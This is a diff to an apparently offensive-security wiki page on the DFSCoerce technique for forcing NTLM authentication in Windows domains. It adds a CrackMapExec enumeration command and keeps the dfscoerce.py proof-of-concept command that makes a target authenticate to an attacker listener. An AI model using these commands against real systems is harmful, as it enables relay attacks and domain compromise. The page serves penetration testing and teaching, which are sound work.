@@ -8,11 +8,23 @@ In mid-2022, [Filip Dragovic](https://twitter.com/filip\_dragovic) demonstrated 
 
 ## Practice
 
+{% tabs %}
+{% tab title="Enumerate" %}
+[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to check if the target is vulnerable to DFSCoerce.
+
+```bash
+crackmapexec smb $IP -u $USER -p $PASSWORD -M dfscoerce
+```
+{% endtab %}
+
+{% tab title="Practice" %}
 The following Python proof-of-concept ([https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)) implements the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` methods.
 
 ```bash
 dfscoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
 ```
+{% endtab %}
+{% endtabs %}
 
 ## Resources
 
